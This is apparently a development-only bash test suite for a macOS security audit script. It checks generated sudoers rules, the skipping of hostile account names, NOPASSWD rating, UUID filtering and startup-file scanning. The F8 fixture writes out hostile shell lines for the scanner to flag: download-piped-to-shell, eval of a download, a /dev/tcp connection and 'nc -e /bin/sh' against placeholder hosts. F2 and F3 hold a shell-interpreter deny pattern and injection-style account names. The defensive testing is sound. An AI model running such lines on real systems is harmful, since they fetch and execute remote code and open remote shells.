#!/bin/bash
# Fixture tests for the logic functions in mac-audit.sh. Development only; not shipped.
# Usage: dev/test.sh   (no root, no network; exits non-zero when a case fails)

cd "$(dirname "$0")/.." || exit 1
# shellcheck source=/dev/null  # the suite lints mac-audit.sh on its own
MAC_AUDIT_LIB=1 . ./mac-audit.sh
T=$(mktemp -d /tmp/mac-audit-test.XXXXXX) || exit 1
# A watchdog stops the suite after 60 seconds, so a hang fails instead of stalling.
( sleep 60; echo "FAIL suite timed out after 60 seconds" >&2; kill -TERM $$ ) & WD=$!
trap '{ kill "$WD"; wait "$WD"; } 2>/dev/null; rm -rf "$T"' EXIT

FAILS=0
check() { local name="$1"; shift; if "$@"; then echo "ok   $name"; else echo "FAIL $name"; FAILS=$((FAILS+1)); fi; }
has()   { grep -qF -- "$2" "$1"; }
hasnt() { ! grep -qF -- "$2" "$1"; }
not()   { ! "$@"; }
visudo_ok() { /usr/sbin/visudo -c -f "$1" >/dev/null 2>&1; }

ACCTS='account root 0 /var/root
account alice 501 /Users/alice
account bob 502 /Users/bob
account _www 70 /Library/WebServer
sudoersd mac-audit
sudoersd extra_rules'

# F1: a normal account list gives a valid file for the granted user.
printf '%s\n' "$ACCTS" | gen_rules bob arm64 > "$T/f1" 2> "$T/f1.err"
check "F1 gen_rules exit status" [ $? -eq 0 ]
check "F1 visudo accepts the rules" visudo_ok "$T/f1"
check "F1 rules for alice" has "$T/f1" "/usr/bin/ssh-keygen -l -f /Users/alice/.ssh/authorized_keys"
check "F1 rules for root" has "$T/f1" "/bin/ls -ln /var/root/Library/LaunchAgents"
check "F1 no rules for the granted user" hasnt "$T/f1" "/Users/bob"
check "F1 no rules for system accounts" hasnt "$T/f1" "/Library/WebServer"
check "F1 sudoers.d files" has "$T/f1" "/bin/cat /etc/sudoers.d/extra_rules"
check "F1 always_set_home follows the alias" [ "$(grep -n 'Cmnd_Alias' "$T/f1" | cut -d: -f1)" -lt "$(grep -n 'always_set_home' "$T/f1" | cut -d: -f1)" ]
check "F1 grant line" has "$T/f1" "bob ALL = (root) NOPASSWD: MACAUDIT"

# F2: no wildcards, no ALL in a command, no shell or interpreter, bputil only on Apple silicon.
grep '^    /' "$T/f1" > "$T/f2.cmds"
check "F2 no * in any rule" hasnt "$T/f1" "*"
check "F2 no ALL in a command" hasnt "$T/f2.cmds" "ALL"
check "F2 no shell, interpreter, editor or sqlite3" [ -z "$(awk '{print $1}' "$T/f2.cmds" | grep -E '/(ba|z|k|c|tc|da)?sh$|python|perl|ruby|osascript|vim?$|nano|emacs|sqlite3|env$')" ]
check "F2 bputil on arm64" has "$T/f1" "/usr/bin/bputil -d"
printf '%s\n' "$ACCTS" | gen_rules bob x86_64 > "$T/f2.intel" 2>/dev/null
check "F2 no bputil on Intel" hasnt "$T/f2.intel" "bputil"

# F3: hostile account names, home folders and sudoers.d names are skipped with a warning.
HOSTILE="$ACCTS
account bad,name 503 /Users/badname
account ev*l 504 /Users/evil
account dots 505 /Users/../etc
account outside 506 /tmp/x
account -dash 507 /Users/dash
account colon:x 508 /Users/c
account eq=x 509 /Users/e
account paren( 510 /Users/p
account back\\slash 511 /Users/b
account spacey 512 /Users/with space
account root 0 /Users/rootfake
sudoersd bad.name
sudoersd st*r
sudoersd br[acket
sudoersd with space"
printf '%s\n' "$HOSTILE" | gen_rules bob arm64 > "$T/f3" 2> "$T/f3.err"
check "F3 gen_rules still succeeds" [ $? -eq 0 ]
check "F3 visudo accepts the rules" visudo_ok "$T/f3"
for bad in badname evil "/Users/../etc" /tmp/x /Users/dash /Users/c /Users/e /Users/p /Users/b "with space" rootfake bad.name "st*r" "br[acket"; do
  check "F3 skips $bad" hasnt "$T/f3" "$bad"
done
check "F3 warns for each skipped item" [ "$(grep -c Skipping "$T/f3.err")" -ge 15 ]

# F4: the granted user must exist and be a regular account.
for u in root _www nosuch "bad name"; do
  printf '%s\n' "$ACCTS" | gen_rules "$u" arm64 > /dev/null 2>&1
  check "F4 refuses granted user '$u'" [ $? -ne 0 ]
done

# F5: sudo refusals are told apart from a command's own failure.
printf 'sudo: a password is required\n' > "$T/e1"
printf "Sorry, user bob is not allowed to execute '/bin/cat /x' as root on host.\n" > "$T/e2"
printf 'sudo: /usr/bin/bputil: command not found\n' > "$T/e3"
printf 'ls: /Users/alice/.zlogin: No such file or directory\n' > "$T/e4"
: > "$T/e5"
check "F5 password required is a refusal" classify_refusal 1 "$T/e1"
check "F5 not allowed is a refusal" classify_refusal 1 "$T/e2"
check "F5 missing command is a refusal" classify_refusal 1 "$T/e3"
check "F5 command failure is not a refusal" not classify_refusal 1 "$T/e4"
check "F5 success is not a refusal" not classify_refusal 0 "$T/e5"

# F6: NOPASSWD rules are found and rated.
cat > "$T/sudoers" <<'EOF'
# alice ALL = (ALL) NOPASSWD: ALL   (a comment)
Defaults env_reset
%admin ALL = (ALL) ALL
alice ALL = (ALL) NOPASSWD: ALL
bob ALL = (root) NOPASSWD: /bin/kill
carol ALL = NOPASSWD:ALL
dave ALL = (root) NOPASSWD: ALLOWED_CMDS
erin ALL = (root) \
    NOPASSWD: ALL
Cmnd_Alias X = /bin/a, \
    /bin/b
EOF
classify_sudoers < "$T/sudoers" > "$T/f6"
check "F6 three NOPASSWD: ALL rules are MEDIUM" [ "$(grep -c '^MEDIUM' "$T/f6")" -eq 3 ]
check "F6 two other NOPASSWD rules are LOW" [ "$(grep -c '^LOW' "$T/f6")" -eq 2 ]
check "F6 continued line joined" has "$T/f6" "erin ALL = (root) NOPASSWD: ALL"
check "F6 comments and Defaults ignored" [ "$(wc -l < "$T/f6" | tr -d ' ')" -eq 5 ]

# F7: allow-lists keep settings and drop identifiers.
cat > "$T/bputil" <<'EOF'
OS Type                       : macOS
Local Policy Nonce Hash (lpnh): 1234567890ABCDEF1234567890ABCDEF12345678
Security Mode: Full (smb0): absent
System Integrity Protection (SIP) : enabled
Volume Group UUID security mode: 11111111-2222-3333-4444-555555555555
3rd Party Kexts Status (smb2): disabled
EOF
filter_bputil < "$T/bputil" > "$T/f7b"
check "F7 bputil keeps the security mode" has "$T/f7b" "Security Mode: Full"
check "F7 bputil keeps SIP" has "$T/f7b" "System Integrity Protection"
check "F7 bputil keeps kexts" has "$T/f7b" "Kexts Status"
check "F7 bputil drops UUIDs and hashes" [ -z "$(grep -E '1111|ABCDEF' "$T/f7b")" ]
cat > "$T/profiles" <<'EOF'
There are 2 configuration profiles installed
_computerlevel[1] attribute: name: Wi-Fi
_computerlevel[1] attribute: profileIdentifier: com.example.wifi
_computerlevel[1] attribute: profileUUID: 11111111-2222-3333-4444-555555555555
_computerlevel[2] attribute: name: 22222222-3333-4444-5555-666666666666
_computerlevel[1] attribute: organization: Example
_computerlevel[1] attribute: installationDate: 2026-01-01
EOF
filter_profiles < "$T/profiles" > "$T/f7p"
check "F7 profiles keeps names, identifiers, organization" [ "$(wc -l < "$T/f7p" | tr -d ' ')" -eq 4 ]
check "F7 profiles drops UUIDs" [ -z "$(grep -E '1111|2222' "$T/f7p")" ]

# F8: startup-file matches name the pattern and never copy the line.
cat > "$T/rc" <<'EOF'
curl -s https://x.example | sh   # SECRET_TOKEN_1
export X=$(echo abc | base64 -D) SECRET_TOKEN_2
bash -c "$(curl -fsSL https://y.example)" SECRET_TOKEN_3
wget -qO- z.example | bash
cat a | bash -s
eval "$(curl q.example)"
exec 3<>/dev/tcp/192.0.2.1/80
nc -e /bin/sh h.example
osascript -e 'beep'
echo harmless
EOF
rc_hits "$T/rc" "$T/missing" > "$T/f8"
check "F8 no line text in the output" [ -z "$(grep -E 'SECRET|example|harmless' "$T/f8")" ]
for want in "1: download piped to a shell" "2: base64 decode" "3: shell running a download" "4: download piped to a shell" \
            "5: shell reading a script from a pipe" "6: eval of a download" "7: /dev/tcp connection" "8: nc with -e" "9: osascript -e"; do
  check "F8 finds $want" has "$T/f8" "$T/rc:$want"
done
check "F8 no match on a harmless line" hasnt "$T/f8" "$T/rc:10:"

# F9: SSH methods that accept a password.
check "F9 password" ssh_methods_flag "(publickey,password)"
check "F9 keyboard-interactive" ssh_methods_flag "(publickey,keyboard-interactive)"
check "F9 publickey alone" not ssh_methods_flag "(publickey)"

# F10: report text from the audited Mac stays in one cell.
# shellcheck disable=SC2016  # the backticks are literal test input
out=$(printf 'evil\nHIGH\tArea|x`y`\rz' | clean_field)
check "F10 one line" [ "$(printf '%s\n' "$out" | wc -l | tr -d ' ')" -eq 1 ]
check "F10 no tab, pipe or backtick" [ -z "$(printf '%s' "$out" | tr -d -c '\t|`')" ]
check "F10 text kept" [ "$out" = "evil HIGH Area/xy z" ]

echo ""
if [ "$FAILS" -eq 0 ]; then echo "All cases passed."; else echo "$FAILS case(s) failed."; exit 1; fi
